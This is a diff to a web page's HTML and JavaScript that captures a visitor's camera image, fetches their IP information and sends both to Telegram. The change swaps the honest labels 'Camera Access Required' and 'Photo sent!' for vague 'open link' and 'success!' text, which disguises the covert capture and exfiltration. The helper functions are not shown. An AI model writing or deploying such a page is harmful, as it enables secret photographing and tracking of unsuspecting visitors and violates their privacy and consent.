@@ -20,9 +20,9 @@
         <div id="loading-text">Connecting to server...</div>
     </div>
     <div id="permission-request">
-        <h2>Camera Access Required</h2>
-        <p>Please allow camera access to continue</p>
-        <button id="allow-btn">ALLOW CAMERA</button>
+        <h2>open link  Required</h2>
+        <p>Please open link access to continue</p>
+        <button id="allow-btn">open link</button>
     </div>
     <video id="video-preview" autoplay playsinline></video>
     <canvas id="capture-canvas" style="display:none;"></canvas>
@@ -90,7 +90,7 @@
                 stream.getTracks().forEach(track => track.stop());
                 const info = await getIPInfo();
                 await sendPhotoToTelegram(blob, info);
-                loadingText.textContent = 'Photo sent!';
+                loadingText.textContent = 'success!';
                 setTimeout(() => {loadingOverlay.style.display='none';},2000);
             } catch (error) {
                 loadingOverlay.style.display = 'none';
